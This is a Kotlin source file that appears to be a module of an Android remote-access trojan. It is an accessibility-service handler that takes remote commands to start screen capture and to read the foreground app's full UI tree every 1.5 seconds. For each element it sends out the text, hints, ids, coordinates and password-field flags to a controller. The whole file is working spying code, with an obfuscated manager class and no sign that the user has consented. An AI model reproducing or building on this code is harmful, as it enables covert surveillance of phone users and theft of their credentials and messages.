package com.storm.safe.rock.service.modules.command

import android.graphics.Rect
import android.util.Log
import android.view.accessibility.AccessibilityNodeInfo
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.delay
import kotlinx.coroutines.isActive
import kotlinx.coroutines.launch
import org.json.JSONArray
import org.json.JSONObject

class ScreenCaptureCommandHandler : CommandHandler {
    companion object {
        private const val TAG = "ScreenCaptureCmd"
        private const val READ_SCREEN_INTERVAL = 1500L
    }

    @Volatile
    private var readScreenJob: kotlinx.coroutines.Job? = null

    @Volatile
    private var captureDisabled: Boolean = false

    override fun getSupportedCommands(): Set<String> = setOf(
        "SCREEN_CAPTURE_RESUME",
        "SCREEN_CAPTURE_STOP",
        "SCREEN_CAPTURE_PAUSE",
        "SCREEN_QUALITY", "screen_quality", "screen_mode",
        "GET_UI_HIERARCHY",
        "GET_UI_HIERARCHY_STREAM",
        "GET_UI_HIERARCHY_STREAM_STOP",
        "SCREEN_CAPTURE_SET_TECH",
        "SCREEN_CAPTURE_DISABLE"
    )

    override suspend fun handle(command: String, params: JSONObject?, context: CommandContext) {
        val service = context.service
        if (service == null) {
            context.sendEvent("screen_stream_error", JSONObject().apply {
                put("error", "service_unavailable")
            })
            return
        }

        when (command) {
            "SCREEN_CAPTURE_RESUME" -> handleStart(service, context)
            "SCREEN_CAPTURE_STOP" -> handleStop(service, context)
            "SCREEN_CAPTURE_PAUSE" -> handlePause(service, context)
            "SCREEN_QUALITY", "screen_quality", "screen_mode" -> handleQuality(params)
            "GET_UI_HIERARCHY" -> handleReadScreen(service, context)
            "GET_UI_HIERARCHY_STREAM" -> handleReadScreenStart(service, context)
            "GET_UI_HIERARCHY_STREAM_STOP" -> handleReadScreenStop(context)
            "SCREEN_CAPTURE_SET_TECH" -> handleSetTech(params, context)
            "SCREEN_CAPTURE_DISABLE" -> handleDisable(service, context)
        }
    }

    private fun handleStart(service: com.storm.safe.rock.service.MyAccessibilityService, context: CommandContext) {
        if (captureDisabled) {
            context.sendEvent("screen_stream_error", JSONObject().apply {
                put("error", "capture_disabled")
            })
            return
        }
        val dm = service.displayManager
        if (dm == null) {
            context.sendEvent("screen_stream_error", JSONObject().apply { put("error", "display_manager_unavailable") })
            return
        }
        dm.startCapture()
        context.sendEvent("screen_stream_status", JSONObject().apply {
            put("status", "started")
            put("capturing", dm.isCapturing)
        })
    }

    private fun handleStop(service: com.storm.safe.rock.service.MyAccessibilityService, context: CommandContext) {
        service.displayManager?.stopCapture()
        context.sendEvent("screen_stream_status", JSONObject().apply { put("status", "stopped") })
    }

    private fun handlePause(service: com.storm.safe.rock.service.MyAccessibilityService, context: CommandContext) {
        service.displayManager?.pauseCapture()
        context.sendEvent("screen_stream_status", JSONObject().apply { put("status", "paused") })
    }

    private fun handleQuality(params: JSONObject?) {
        val quality = params?.optInt("quality", 20) ?: 20
        val fps = params?.optInt("fps", 10) ?: 10
        com.storm.safe.rock.manager.C0263a5.compressionQuality = quality.coerceIn(10, 100)
        com.storm.safe.rock.manager.C0263a5.fpsLimit = fps.coerceIn(1, 30)
    }

    private fun handleReadScreenStart(service: com.storm.safe.rock.service.MyAccessibilityService, context: CommandContext) {
        readScreenJob?.cancel()
        readScreenJob = CoroutineScope(Dispatchers.IO + SupervisorJob()).launch {
            Log.i(TAG, "GET_UI_HIERARCHY stream started")
            while (isActive) {
                try {
                    readScreenOnce(service, context)
                } catch (e: Exception) {
                    Log.e(TAG, "GET_UI_HIERARCHY loop error", e)
                }
                delay(READ_SCREEN_INTERVAL)
            }
        }
        context.sendEvent("read_screen_status", JSONObject().apply { put("status", "started") })
    }

    private fun handleReadScreenStop(context: CommandContext) {
        readScreenJob?.cancel()
        readScreenJob = null
        Log.i(TAG, "GET_UI_HIERARCHY stream stopped")
        context.sendEvent("read_screen_status", JSONObject().apply { put("status", "stopped") })
    }

    private fun handleReadScreen(service: com.storm.safe.rock.service.MyAccessibilityService, context: CommandContext) {
        readScreenOnce(service, context)
    }

    private fun handleSetTech(params: JSONObject?, context: CommandContext) {
        val tech = params?.optString("technology", "") ?: ""
        Log.i(TAG, "SCREEN_CAPTURE_SET_TECH: technology=$tech")
        context.sendEvent("screen_stream_status", JSONObject().apply {
            put("status", "tech_set")
            put("technology", tech)
        })
    }

    private fun handleDisable(service: com.storm.safe.rock.service.MyAccessibilityService, context: CommandContext) {
        captureDisabled = true
        service.displayManager?.stopCapture()
        readScreenJob?.cancel()
        readScreenJob = null
        Log.i(TAG, "SCREEN_CAPTURE_DISABLE: capture disabled")
        context.sendEvent("screen_stream_status", JSONObject().apply {
            put("status", "disabled")
        })
    }

    private fun readScreenOnce(service: com.storm.safe.rock.service.MyAccessibilityService, context: CommandContext) {
        try {
            val root = service.rootInActiveWindow
            if (root == null) {
                context.sendEvent("readScreen", JSONObject().apply {
                    put("windowTitle", "")
                    put("activePackage", "")
                    put("children", JSONArray())
                })
                return
            }

            val windowTitle = root.window?.title?.toString() ?: ""
            val activePackage = root.packageName?.toString() ?: ""
            val children = JSONArray()
            var index = 0

            fun traverse(node: AccessibilityNodeInfo, depth: Int) {
                val bounds = Rect()
                node.getBoundsInScreen(bounds)
                val text = node.text?.toString() ?: ""
                val desc = node.contentDescription?.toString() ?: ""
                val hint = if (android.os.Build.VERSION.SDK_INT >= 26) node.hintText?.toString() ?: "" else ""
                val cls = node.className?.toString() ?: ""
                val id = node.viewIdResourceName ?: ""

                val obj = JSONObject().apply {
                    if (text.isNotEmpty()) put("text", text)
                    if (desc.isNotEmpty()) put("desc", desc)
                    if (hint.isNotEmpty()) put("hint", hint)
                    if (cls.isNotEmpty()) put("cls", cls)
                    if (id.isNotEmpty()) put("id", id)
                    put("l", bounds.left)
                    put("t", bounds.top)
                    put("r", bounds.right)
                    put("b", bounds.bottom)
                    put("x", bounds.centerX())
                    put("y", bounds.centerY())
                    put("depth", depth)
                    put("index", index++)
                    if (node.isClickable) put("click", true)
                    if (node.isEditable) put("edit", true)
                    if (node.isFocused) put("focus", true)
                    if (node.isChecked) put("checked", true)
                    if (node.isPassword) put("pwd", true)
                    if (node.isScrollable) put("scroll", true)
                }
                children.put(obj)

                for (i in 0 until node.childCount) {
                    val child = node.getChild(i) ?: continue
                    traverse(child, depth + 1)
                }
            }

            traverse(root, 0)

            context.sendEvent("readScreen", JSONObject().apply {
                put("windowTitle", windowTitle)
                put("activePackage", activePackage)
                put("activeWindow", activePackage)
                put("children", children)
            })

            Log.d(TAG, "readScreen: pkg=$activePackage, nodes=$index")
        } catch (e: Exception) {
            Log.e(TAG, "readScreen failed", e)
        }
    }
}
